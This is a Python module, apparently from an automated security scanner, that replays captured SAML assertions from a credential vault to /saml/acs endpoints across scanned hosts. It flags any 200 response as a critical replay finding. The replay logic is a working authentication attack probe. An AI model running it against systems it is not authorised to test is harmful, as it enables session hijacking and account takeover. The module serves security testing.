"""SAML assertion replay attack probes."""

from __future__ import annotations

import base64
import logging
import re
from typing import Any
from urllib.parse import urlparse

from src.analysis._core.http_request import _safe_request
from src.analysis.active.auth.credential_vault import CredentialVault
from src.analysis.passive.runtime import ResponseCache

logger = logging.getLogger(__name__)

SAML_RESPONSE_PATTERN = re.compile(r"(?i)SAMLResponse=([^&\s]+)")


def _extract_saml_response(text: str) -> str | None:
    match = SAML_RESPONSE_PATTERN.search(text)
    if not match:
        return None
    raw = match.group(1)
    try:
        return base64.b64decode(raw).decode("utf-8", errors="replace")
    except Exception:  # noqa: S110
        return raw


def _replay_endpoints(base_url: str, scan_hosts: set[str]) -> list[str]:
    source_netloc = _netloc(base_url)
    netlocs = {source_netloc} if source_netloc else set()
    netlocs.update(_clean(host) for host in scan_hosts if _is_web_target(host))
    if not netlocs:
        return [base_url]
    try:
        scheme = urlparse(base_url).scheme or "https"
    except (ValueError, TypeError) as exc:
        logger.debug("URL parse failed for %s: %s", base_url, exc)
        scheme = "https"
    return [f"{scheme}://{netloc}/saml/acs" for netloc in netlocs]


def _netloc(url: str) -> str:
    try:
        return _clean(urlparse(url).hostname)
    except Exception:  # noqa: S110
        return ""


def _replay_response(endpoint: str, assertion_value: str) -> dict[str, Any] | None:
    encoded = base64.b64encode(assertion_value.encode("utf-8")).decode("ascii")
    body = (
        "SAMLResponse=" + encoded + "&RelayState=&SigAlg=http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"
    )
    return _safe_request(endpoint, method="POST", body=body.encode("utf-8"), timeout=12)


def _endpoint_key(url: str) -> str:
    try:
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.hostname}{parsed.path or '/'}"
    except Exception:  # noqa: S110
        return url


def _clean(host: str) -> str:
    return (host or "").split(":", 1)[0].strip().lower()


def _is_web_target(host: str) -> bool:
    host = _clean(host)
    if not host:
        return False
    if host.endswith((".local", ".lan", ".internal")):
        return False
    if host in ("localhost", "127.0.0.1", "::1", "0.0.0.0"):
        return False
    import re
    if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", host):
        return False
    return True


def run_assertion_replay(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    credential_vault: CredentialVault | None = None,
    *,
    limit: int = 12,
) -> list[dict[str, Any]]:
    vault = credential_vault or CredentialVault()
    findings: list[dict[str, Any]] = []
    seen_endpoints: set[str] = set()
    history = vault.saml_assertions()
    for entry in history:
        if len(findings) >= limit:
            break
        assertion_value = None
        credential_id = entry.get("credential_id")
        credential = vault.get_credential_for_url(entry.get("scope_url") or "")
        if credential:
            assertion_value = credential.value
            source_url = credential.scope_url or entry.get("scope_url") or ""
        else:
            assertion_value = entry.get("assertion_value")
            source_url = entry.get("scope_url") or ""
        if not assertion_value:
            continue
        endpoint_key = _endpoint_key(source_url)
        if endpoint_key in seen_endpoints:
            continue
        seen_endpoints.add(endpoint_key)
        for endpoint in _replay_endpoints(source_url, vault.scan_host_netlocs):
            if len(findings) >= limit:
                break
            response = _replay_response(endpoint, assertion_value)
            if not response or int(response.get("status", 0)) != 200:
                continue
            findings.append(
                {
                    "url": endpoint,
                    "endpoint_key": endpoint_key,
                    "attack": "assertion_replay",
                    "original_credential_id": credential_id,
                    "original_scope_url": source_url,
                    "response_status": 200,
                    "confidence": 0.95,
                    "severity": "critical",
                }
            )
    findings.sort(key=lambda item: (-item.get("confidence", 0.0), item.get("url", "")))
    return findings[:limit]
